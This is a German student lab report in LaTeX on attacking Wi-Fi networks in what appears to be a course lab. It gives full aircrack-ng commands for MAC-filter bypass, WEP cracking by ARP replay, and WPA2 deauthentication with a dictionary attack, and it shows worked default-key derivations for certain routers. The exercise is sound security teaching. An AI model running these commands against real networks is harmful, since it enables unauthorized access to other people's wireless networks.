\documentclass[10pt,a4paper]{article}
\usepackage[utf8]{inputenc}
\usepackage{amsmath}
\usepackage{amsfonts}
\usepackage{amssymb}
\usepackage{graphicx}
\usepackage{todo}
\usepackage[ngerman]{babel}
\usepackage{hyperref}
\usepackage[left=2cm]{geometry}
\author{Christoph Robbert 6577945, Peter Stilow 6500440}
\title{Protokoll 1 - WLAN}
\begin{document}
\maketitle
 
\section{Aufgabe 1}

Wir verwenden in dieser Aufgabe aircrack-ng um in die WLANs einzudringen. Die WLAN-Karte hat in dieser Aufgabe die Bezeichnung \texttt{wlan1}
Nachdem wir die WLAN-Karte laut aircrack-ng Tutorial eingerichtet haben, bringen wir sie mittels
\texttt{airmon-ng start wlan1} in den Monitormode. Mittels \texttt{airodump-ng mon7} haben wir folgende Channels und BSSIDs bestimmt:
\begin{verbatim}
BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                                                                                                 
                                                                                                                                                                                
 64:70:02:1C:4F:13  -22       32        0    0   3  54   WPA2 CCMP   PSK  SecureBernd                                                                                           
 64:70:02:1A:B1:81  -25       41        0    0   2  54   WEP  WEP         Bernd                                                                                                 
 64:70:02:1C:4F:3A  -26       62        0    0   1  54   OPN              OpenBernd                                                                                             
....(Die gleichen Daten für einige webauth und eduroam Access Points.)....
\end{verbatim}
Die MAC Adresse der benutzten WLAN Karte lautet \texttt{00:C0:CA:55:54:5F}.
Die Daten zeigen, dass SecureBernd im WPA2 Modus betrieben wird, Bernd mittels WEP gesichert ist und das Netzwerk OpenBernd nicht gesichert ist. Ein erster Verbindungsversuch zu OpenBernd scheitert. Anscheinend wird eine Zugangskontrolle mittels MAC Filter vorgenommen.

\subsection{Angriff auf OpenBernd}

Mittels \texttt{airodump-ng -w output mon8} beobachteten wir den WLAN Netzwerkverkehr. Das Interface \texttt{mon8} war das Zugangsinterface zum Interface \texttt{wlan1} im Monitormode. Die folgende Zeile fiel aus dabei auf. Ein Gerät mit der MAC Adresse \texttt{00:C0:CA:55:54:5C} hat sich versucht am Netzwerk \texttt{OpenBernd} anzumelden.
\begin{small}
\begin{verbatim}
Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs
....
00:C0:CA:55:54:5C, 2013-11-11 16:39:42, 2013-11-11 16:39:42, -61,        1, 64:70:02:1C:4F:3A, OpenBernd
...
\end{verbatim}
\end{small}
Nach dem wir mittels \texttt{ip link set dev wlan1 address 00:C0:CA:55:54:5C} die MAC Adresse unseres Interface \texttt{wlan1} geändert hatten, konnten wir uns mit dem Netz \texttt{OpenBernd} verbinden.

\subsection{Angriff auf Bernd}

Als erstes haben wir mit dem folgenden Kommando überprüft, ob wir mit der Netzwerkkarte in das Netzwerk Bernd Packete injizieren können.
\begin{verbatim}
aireplay-ng --test -e Bernd -a 64:70:02:1A:B1:81 --ignore-negative-one wlan1
\end{verbatim}
Da unser Client nicht am Access Point authentifiziert ist, führen wir mittels eine Fakeauthentifizierung durch.
\begin{verbatim}
aireplay-ng  -1 0 -e Bernd -a 64:70:02:1A:B1:81 -h 00:C0:CA:55:54:5F --ignore-negative-one wlan1
\end{verbatim}
Dannach schnitten wir alle Packete im Netzwerk mit:
\begin{verbatim}
airodump-ng -c 2 --bssid 64:70:02:1A:B1:81 -w output wlan1
\end{verbatim}
Um die Menge an beobachteten Packeten zu erhöhen fuhren wir eine ARP Replayattacke. Dabei wird jedes abgefangene Packet wieder in das Netzwerk eingespielt.
\begin{verbatim}
aireplay-ng -3 -b 64:70:02:1A:B1:81 -h 00:C0:CA:55:54:5F wlan1
\end{verbatim}
Nach circa 10 Minuten Packete mitschneiden knackten wir auf Basis der mitgeschnittenen Packete den WEP PreSharedKey:
\begin{verbatim}
aircrack-ng -b 64:70:02:1A:B1:81 output*.cap
\end{verbatim}
\begin{tiny}
\begin{verbatim}
                                                                 [00:00:00] Tested 835 keys (got 93526 IVs)

   KB    depth   byte(vote)
    0    0/ 25   71(122112) F5(107008) 3B(105216) 1B(103680) 94(103424) 90(103168) 3A(102656) A6(102656) 59(102400) CA(102400) 45(102144) 8B(101376) 9B(101120) 56(100864) 
    1    1/  1   E6(108288) 64(106496) 48(105472) 08(104960) 93(103936) 16(103424) 6B(103168) 92(102912) AA(102912) 74(102656) 56(102400) D9(102400) 9A(102144) 9F(102144) 
    2    0/  1   F9(131328) EF(108288) D0(107264) DF(107264) D2(105984) D9(105216) 02(104448) 7C(103936) E2(103168) 12(102912) C6(102912) 1A(102144) AB(102144) EA(102144) 
    3    0/  1   47(136960) 35(107776) 6B(106240) 74(106240) A2(106240) 08(105984) 70(104960) A3(104192) BE(103168) 22(102656) 31(102656) 87(102656) A8(102656) E8(102656) 
    4   14/  4   50(102144) 93(101632) 40(101120) B5(100864) 17(100608) 44(100608) 5B(100352) 75(100352) 18(100096) A3(100096) 55(99584) E3(99584) 26(99328) 65(99328) 

     KEY FOUND! [ 71:32:56:4E:4B:7A:31:47:73:52:71:59:41 ] (ASCII: q2VNKz1GsRqYA )
	Decrypted correctly: 100%
\end{verbatim}
\end{tiny}
Der verwendete WEP Key im Netzwerk Bernd lautet also: \texttt{q2VNKz1GsRqYA}.
%http://www.aircrack-ng.org/doku.php?id=simple_wep_crack#step_1_-_start_the_wireless_interface_in_monitor_mode_on_ap_channel


\subsection{Angriff auf SecureBernd}

Mittels \texttt{sudo airodump-ng -c 3 --bssid 64:70:02:1C:4F:13 -w psk wlan1} schnitten wir den gesamten Verkehr mitsamt der 4 Way Handshakes des WPA2 mit und speicherten sie. Da wir keine Handshakes sahen, fuhren wir mittels 
\begin{verbatim}
sudo aireplay-ng -0 1 -a 64:70:02:1C:4F:13 -c 00:C0:CA:55:54:5E wlan2 --ignore-negative-one
\end{verbatim}
Eine deauthentificationsattacke. Dadurch versuchten wir, dass sich der Client mit der MAC Adresse
\texttt{00:C0:CA:55:54:5E} wieder mit dem Accesspoint verbindet. Laut der Ausgabe von \texttt{airodump-ng} haben wir mindestens einen Handshake mitgeschnitten.
Danach starteten wir einen BruteForce Angriff auf den mitgeschnittenen Handshake mittels
\begin{verbatim}
aircrack-ng -w password.lst -b 64:70:02:1C:4F:13 psk*.cap
\end{verbatim}
Dabei war password.lst die in aircrack mitgelieferte Passwortliste. Leider fanden wir keinen Treffer. Auch die in KaliLinux mitgelieferte Passwortliste \texttt{rock-you} fand keinen Treffer. Erst die Passwortliste \texttt{darkc0de} brachte \texttt{zygosaccharomyces} als Passwort hervor.


\subsection{Ergebnisse:}
\begin{itemize}
	\item Zugriff auf das WLAN \texttt{OpenBernd} bekommt man indem man seine MAC Adresse auf \texttt{00:C0:CA:55:54:5C} ändert.
	\item Das WLAN \texttt{Bernd} ist mit dem WEP Passwort \texttt{q2VNKz1GsRqYA} gesichert.
	\item Das WLAN \texttt{SecureBernd} ist mit dem WPA2 Passwort \texttt{zygosaccharomyces} abgesichert.
\end{itemize}



\section{Aufgabe 2}

\section{Aufgabe 3}

\subsection*{a)}
Berechung laut \href{http://www.wotan.cc/?p=6}{http://www.wotan.cc/?p=6}:\\
MAC: 00:15:BA:6D:9A:2E\\
Letzten 2 Bytes als 10 stellige Dezimalzahl:\\
C1 = DEZ(9A2E) = 39470\\
 
S6 ist die 1. Stelle von C1, S7 ist die 2. Stelle usw.\\
S6 = C1[0] = 3 \\
S7 = C1[1] = 9 \\
S8 = C1[2] = 4 \\
S9 = C1[3] = 7 \\
S10 = C1[4] = 0 \\
 
M7 ist das 7 Zeichen der MAC-Adresse, M8 das 8. usw.\\
M7 =  6 \\
M8 =  D \\
M9 =  9 \\
M10 =  A \\
M11 =  2 \\
M12 =  E \\

K1 = Letztes Nibble (Halb-Byte) von (S7 + S8 + M11 + M12)\\
K1 =  D \\

K2 = Letztes Nibble (Halb-Byte) von (M9 + M10 + S9 + S10)\\
K2 =  A \\

Variablen berechnen:\\
X1 = K1  XOR S10 =  D \\
X2 = K1  XOR S9  =  A \\
X3 = K1  XOR S8  =  9 \\
Y1 = K2  XOR M10 =  0 \\
Y2 = K2  XOR M11 =  8 \\
Y3 = K2  XOR M12 =  4 \\
Z1 = M11 XOR S10 =  2 \\
Z2 = M12 XOR S9  =  9 \\
Z3 = K1  XOR K2  =  7 \\
 
Der Vollstaendige Key lautet dann:\\
x1 y1 z1 x2 y2 z2 x3 y3 z3 = D02A89947 \\\\


\subsection*{b)}
Berechung laut \href{https://xkyle.com/verizon-fios-wireless-key-calculator/}{https://xkyle.com/verizon-fios-wireless-key-calculator/}:
Der Key wird aus zwei Quellen berechnet. Der MAC Adresse und der SSID. Die MAC Adresse bestimmt die erste Hälfte des Keys. Bei der Berechnung wird auf die zweite und dritte Stelle der MAC Adresse zugegriffen. Da der Hersteller vom Verizon FiOS für seine Geräte nur zwei Adressbereiche wählt, ergeben sich nur zwei Kombinationen: 1801 oder 1F90. 
Die zweite Hälfte des Keys berechnet sich aus der SSID. Diese ist 5 Zeichen lang und stellt eine Zahl zur Basis 36 dar. Dabei ist zu beachten, dass man den String umdreht um an die Zahl zu gelangen.
Am Beispiel Bernd lautet es wie folgt:\\
\begin{align*}
B*(36^0) = &11 * 1 = 11\\
E*(36^1) = &14 * 36 = 504\\
R*(36^2) = &27 * 1296 = 34992\\
N*(36^3) = &23 * 46656 = 1073088\\
D*(36^4) = &13 * 1679616 = 21835008\\
Summe = &22943603 = 0x15E1773
\end{align*}
Daraus folgt die beiden möglichen Keys sind: 180115E1773 und 1F9015E1773
\end{document}